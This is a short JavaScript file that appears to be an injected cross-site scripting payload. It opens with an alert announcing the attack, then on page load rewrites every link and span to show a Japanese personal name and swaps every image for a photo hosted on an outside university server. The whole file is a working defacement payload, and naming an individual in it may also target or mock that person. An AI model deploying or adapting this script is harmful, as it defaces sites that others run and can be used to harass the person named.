alert('XSS exploit has been Attacked!');
window.onload = () => {
  let a = document.getElementsByTagName('a')
  Array.prototype.slice.call(a).forEach(ele => {
    ele.innerHTML = '日野原龍一'
  });
  let span = document.getElementsByTagName('span')
  Array.prototype.slice.call(span).forEach(ele => {
    ele.innerHTML = '日野原龍一'
  });
  let img = document.getElementsByTagName('img')
  Array.prototype.slice.call(img).forEach(ele => {
    ele.src = 'http://hbs.ws.hosei.ac.jp/wp-content/uploads/2014/11/SusumagoNUS-180x192.jpg'
  })
}
